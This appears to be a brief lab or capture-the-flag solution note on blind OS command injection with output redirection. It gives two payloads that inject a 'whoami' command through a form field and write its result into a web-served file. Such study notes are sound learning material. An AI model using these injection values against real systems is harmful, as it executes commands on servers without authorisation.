---
title: "3 - Blind OS command injection with output redirection"
---

# 3 - Blind OS command injection with output redirection

```bash
email=x||echo+"$(whoami)"+>+/var/www/images/54.jpg||
```

```bash
& whoami > /var/www/static/whoami.txt &
```
